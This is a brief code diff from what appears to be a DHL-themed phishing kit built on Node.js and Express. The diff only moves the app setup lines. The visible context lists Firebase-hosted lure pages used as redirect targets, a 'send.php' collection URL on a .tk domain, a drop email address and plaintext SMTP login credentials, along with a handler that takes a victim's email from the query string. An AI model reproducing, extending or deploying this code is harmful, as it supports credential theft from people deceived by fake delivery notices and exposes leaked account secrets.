@@ -7,6 +7,8 @@ const express_1 = __importDefault(require("express"));
 const axios_1 = __importDefault(require("axios"));
 const fs_1 = __importDefault(require("fs"));
 const body_parser_1 = __importDefault(require("body-parser"));
+const app = express_1.default();
+app.use(body_parser_1.default.urlencoded({ extended: true }));
 const redirectArray = [
     'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%2010.html?alt=media&token=0ee05c1e-4bec-4bc2-a632-64a96bd9f958',
     'https://firebasestorage.googleapis.com/v0/b/inbox-code.appspot.com/o/dhl%2Findex%20copy%202.html?alt=media&token=f4568c0b-fba4-4cee-82b2-656750705117',
@@ -23,8 +25,6 @@ const redirectArray = [
 const link = 'https://wertyh.tk/cgi-bin/vendor/send.php', email = 'alxy697@gmail.com', smtpusername = 'dhl@1carwash.ml', smtppass = 'ifeanyi12345', smtpservername = '1carwash.ml', lastRedirect = '';
 // test();
 // run $ nodemon index.js
-const app = express_1.default();
-app.use(body_parser_1.default.urlencoded({ extended: true }));
 app.get('/', (req, res) => {
     const email = req.query.email;
     const files = fs_1.default.readdirSync(__dirname + '/redirects/');
